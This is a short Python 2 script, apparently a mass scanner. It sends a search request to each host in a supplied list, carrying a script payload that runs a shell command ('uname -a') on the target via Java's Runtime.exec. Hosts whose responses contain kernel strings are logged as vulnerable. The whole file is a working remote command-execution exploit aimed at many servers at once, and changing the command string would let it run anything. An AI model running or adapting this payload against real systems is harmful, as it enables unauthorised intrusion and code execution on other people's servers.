#!/usr/bin/env python

__author__ = "Jason Schorr"
__version__ = "0.2"
__maintainer__ = "Jason Schorr"
__email__ = "jasonschorr@gmail.com"
__status__ = "Testing"

import requests
from requests import *
import sys


headers = {'content-type': 'application/json'}
values = '{"size": 1, "query": {"filtered": {"query": {"match_all": {} } } }, "script_fields": {"results": {"script": "new java.util.Scanner(Runtime.getRuntime().exec(new String[]{ \\"/bin/sh\\", \\"-c\\", \\"uname -a;\\"}).getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"} } }'
linux_valid = "GNU/Linux"
osx_valid = "Darwin Kernel"

v_path = "vulnerable.txt"
n_path = "not_vulnerable.txt"
c_path = "connection_error.txt"

results = { "vulnerable":[], "notvuln":[], "connectionerror":[] }

def result(idx, line, res):
	print "%s\t%s\t%s" % (idx, line, res)


if len(sys.argv) != 2:
	print sys.argv[0] + " <filename in host:ip format>"
	sys.exit(2)

filename = sys.argv[1]

try:
	with open(filename) as f:
		lines = f.readlines()
except IOError:
	print "File %s not found" % filename
	print sys.argv[0] + " <filename in host:ip format>"
	sys.exit(100)


for idx, line in enumerate(lines):
	line = line.strip()
	for c in line:
		if c not in '0123456789:.':
			print 'Bad character in line:  %s' % line
	url = "http://" + line + "/_search"
	try:
		r = requests.request('GET', url, data=values, headers=headers, timeout=3)
	except Exception:
		result(idx, line, 'Connection error')
		with open(c_path, 'a') as v:
			v.write(str(idx) + "," + line + ",Connection error\n")
		results["connectionerror"].append(line)
		continue

	if (linux_valid in r.text) or (osx_valid in r.text):
		result(idx, line, 'Vulnerable')
		with open(v_path, "a") as v:
			v.write(str(idx) + "," + line + ",Vulnerable\n")
		results["vulnerable"].append(line)
		
	else:
		result(idx, line, 'Not Vulnerable')
		with open(n_path, "a") as v:
			v.write(str(idx) + "," + line + ",Not Vulnerable\n")
		results["notvuln"].append(line)	


print "Vulnerable hosts: " + str(len(results["vulnerable"]))
print "Not-vulnerable hosts: " + str(len(results["notvuln"]))
print "Connection Errors: " + str(len(results["connectionerror"]))



